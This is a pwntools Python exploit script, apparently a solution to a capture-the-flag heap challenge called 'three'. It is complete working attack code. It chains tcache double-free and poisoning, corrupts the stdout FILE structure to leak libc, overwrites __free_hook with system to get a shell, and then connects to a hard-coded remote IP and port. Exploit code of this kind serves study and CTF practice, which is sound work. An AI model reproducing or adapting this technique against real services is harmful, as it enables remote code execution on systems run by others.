from pwn import *

def alloc(data):
	r.sendlineafter('choice:', '1')
	r.sendafter('content:', data)

def edit(idx, data):
	r.sendlineafter('choice:', '2')
	r.sendlineafter('idx:', str(idx))
	r.sendafter('content:', data)

def free(idx, delete='n'):
	r.sendlineafter('choice:', '3')
	r.sendlineafter('idx:', str(idx))
	if delete == "pwned":
		return
	r.sendlineafter('(y/n):', delete)

def pwn():

	alloc('a'*8)
	alloc('b'*8)
	alloc('c'*8)

	free(2, 'y')
	free(0)
	free(1, 'y')
	free(0)

	edit(0, p8(0x50))

	alloc('c'*8)
	alloc(p64(0) + p64(0x51))
	
	free(1, 'y')

	edit(2, p64(0) + p64(0xa1))

	for i in xrange(7):
		free(0)

	free(0, 'y')
	# aslro off
	#edit(2, p64(0) + p64(0x51) + p16(0x0760) + p8(0xdd))
	# aslro on
	edit(2, p64(0) + p64(0x51) + p16(0x7760))
	
	alloc('d'*8)

	# _flags + _IO_read_ptr + _IO_read_end + _IO_read_base + null poison _IO_write_base
	# see: https://vigneshsrao.github.io/babytcache/
	alloc(p64(0xfbad1800) + p64(0)*3 + p8(0))

	r.recv(8)
	libc = u64(r.recv(6).ljust(8, chr(0))) - 0x3ed8b0
	__free_hook = libc + 0x3ed8e8
	system = libc + 0x4f440
	log.success('Libc: 0x{:x}'.format(libc))
	
	free(0, 'y')
	edit(2, p64(0) + p64(0x51) + p64(__free_hook))

	alloc('kek')

	edit(2, p64(0) + p64(0x61))
	free(0, 'y')

	edit(2, 'sh')

	alloc(p64(system))

	free(2, 'pwned')

	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == "r":
		r = remote('39.96.13.122', 9999)
	else:
		r = process('./three')
		pause()
	pwn()
